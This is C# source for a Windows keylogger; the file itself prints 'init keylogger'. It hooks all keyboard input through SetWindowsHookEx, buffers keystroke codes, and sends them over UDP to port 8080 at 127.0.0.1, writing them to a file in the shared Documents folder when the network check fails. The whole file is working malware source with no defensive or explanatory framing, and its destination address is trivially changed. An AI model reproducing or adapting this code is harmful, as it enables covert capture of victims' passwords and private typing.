using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

class InterceptKeys
{
	private static StreamWriter myfileStream;
	private const int WH_KEYBOARD_LL = 13;
	private const int WM_KEYDOWN = 0x0100;
	private const int WM_KEYUP = 0x0101;
	private const int WM_SYSKEYDOWN = 0x0104;
	private const int WM_SYSKEYUP = 0x0105;
	private bool shift;
	private bool ctrl;
	private bool alt;
	private bool altGr;
	private static LowLevelKeyboardProc _proc = HookCallback;
	private static SendData _sendData = SendVkCode;
	private static IntPtr _hookID = IntPtr.Zero;
	private static readonly string myPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
				"myfile.txt");
	private static readonly int port = 8080;
	private static readonly int maxDataLenght = 100;
	private static List<int> newValue = new List<int>();
	private static bool networkWorking = false;
	public static void Main()
	{
		try
		{
			myfileStream = new StreamWriter(myPath, true);
			String text = "init keylogger:";
			myfileStream.WriteLine(text.ToString());
			myfileStream.Close();
			networkWorking = CheckNetwork("127.0.0.1");
		}
		catch (Exception err)
		{
			Console.WriteLine(err.ToString());
		}
		_hookID = SetHook(_proc);
		Application.Run();
		UnhookWindowsHookEx(_hookID);
		myfileStream.WriteLine();
		myfileStream.Close();
	}

	private static IntPtr SetHook(LowLevelKeyboardProc proc)
	{
		using (ProcessModule curModule = Process.GetCurrentProcess().MainModule)
		{
			return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
		}
	}

	private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
	{

		using (myfileStream = new StreamWriter(myPath, true))
		{

			if (nCode >= 0)
			{
				Task.Run(() => EvaluateData(lParam, wParam));
			}
		}
		return CallNextHookEx(_hookID, nCode, wParam, lParam);
	}

	private static void EvaluateData(IntPtr lParam, IntPtr wParam)
	{
		int vkData = Marshal.ReadInt32(lParam);
		int vkAction = (int)wParam;
		var actionKey = "";
		switch (vkAction)
		{
			case WM_KEYDOWN:
				actionKey = nameof(WM_KEYDOWN);
				break;
			case WM_KEYUP:
				actionKey = nameof(WM_KEYUP);

				break;
			case WM_SYSKEYDOWN:
				actionKey = nameof(WM_SYSKEYDOWN);
				break;
			case WM_SYSKEYUP:
				actionKey = nameof(WM_SYSKEYUP);
				break;
		}
		newValue.Add(vkAction);
		newValue.Add(vkData);
		//newValue.Add(vkAction);
		var text = Marshal.PtrToStringAnsi(lParam);

#if DEBUG
		TraceLog(myfileStream, $"Action: {actionKey} - \t" +
			$"lParam: {lParam} - " +
			$"ReadToInt: {vkData} - " +
			$"PtrToString: {text}",
			true);
#endif
		if (newValue.Count > maxDataLenght)
		{
			Task.Run(() => SaveTheData());
		}
	}

	private static void SaveTheData()
	{
		var data = DataToSave();
		if (networkWorking)
		{
			var bytesToSend = Encoding.ASCII.GetBytes(data);
			_sendData(bytesToSend, "127.0.0.1");
		}
		else
		{
			try
			{
				TraceLog(myfileStream, new string(data));
			}
			catch { }
		}
	}

	private static bool CheckNetwork(string ipAddress)
	{
		var pingSender = new Ping();
		var pingOptions = new PingOptions()
		{
			DontFragment = true,
		};
		string data = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
		byte[] buffer = Encoding.ASCII.GetBytes(data);
		var pingReplay = pingSender.Send(ipAddress,
			1200,
			buffer,
			pingOptions);
		return pingReplay.Status == IPStatus.Success;
	}
	private static void SendVkCode(byte[] data, string address, bool forceResend = false)
	{
		try
		{
			using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
			{
				socket.SendTo(data, new IPEndPoint(IPAddress.Parse(address), port));
			}
		}
		catch (Exception e)
		{
			if (forceResend)
			{
				SendVkCode(data, address, forceResend);
			}
		}
	}

	private static char[] DataToSave()
	{
		//var pcName = $"{Environment.MachineName}-{DateTime.UtcNow}:".ToArray();
		var maxVkLenght = maxDataLenght;// - pcName.Length - 1;
		var vkCodesArray = newValue.Take(maxVkLenght).Select(value => (char)value).ToArray();
		newValue.RemoveRange(0, vkCodesArray.Length - 1);
		//var data = pcName.Concat(vkCodesArray).ToArray();
		var data = vkCodesArray;
		return data;
	}

	private static void TraceLog(StreamWriter streamWriter, string message, bool debug = false)
	{
		if (!debug)
		{
			myfileStream.WriteLine(message);
		}
		else
		{
			Trace.WriteLine(message);
		}
	}

	#region delegate
	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private delegate void SendData(byte[] data, string ipAddress, bool forceResend = false);
	#endregion

	#region user32.dll import
	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool UnhookWindowsHookEx(IntPtr hhk);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string lpModuleName);
	#endregion

}
